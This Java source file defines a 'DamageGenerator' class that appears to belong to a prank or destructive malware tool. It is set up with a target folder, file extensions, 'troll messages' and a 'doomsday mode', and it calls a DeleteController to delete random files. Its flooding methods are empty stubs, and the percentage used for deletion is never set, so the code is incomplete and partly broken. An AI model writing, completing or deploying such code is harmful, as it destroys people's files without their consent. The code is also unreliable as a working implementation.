
package com;

import java.io.File;

public class DamageGenerator {
	private static int damage, percent;
	private static String message[], extentions[];
	private static File path;
	private static boolean random = false, doomsDayMode = false, delete = false;

	public DamageGenerator(int damage, File path, String extentions[], String trollMessage[], boolean random, int percent,
			boolean doomsday, boolean delete) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extentions = extentions;
		DamageGenerator.random = random;
		DamageGenerator.doomsDayMode = doomsday;
		DamageGenerator.delete = delete;
		DamageGenerator.message = trollMessage;
	}

	public DamageGenerator(int damage, File path, String extentions[], String trollMessage[]) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extentions = extentions;
		DamageGenerator.message = trollMessage;
	}

	public DamageGenerator(int damage, File path, String extentions[], boolean random, int percent, boolean doomsday,
			boolean delete) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extentions = extentions;
		DamageGenerator.random = random;
		DamageGenerator.doomsDayMode = doomsday;
		DamageGenerator.delete = delete;
	}

	public DamageGenerator(int damage, File path, String extentions[]) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extentions = extentions;
	}

	public void DoDamage() {
		if (doomsDayMode) {
			damage *= extentions.length;
		}
		if (delete) {
			Deleting();
		}
		if (random) {
			randomFlooding();
		}

	}

	public static void Deleting() {
		DeleteController deleteController =new DeleteController(path, percent);
		deleteController.DeleteRandomStuff();
		
		if (doomsDayMode== false) {
			damage*=percent/100;
		}
		
	}

	public static void randomFlooding() {

	}
	
	public static void Flood() {
		
	}

}
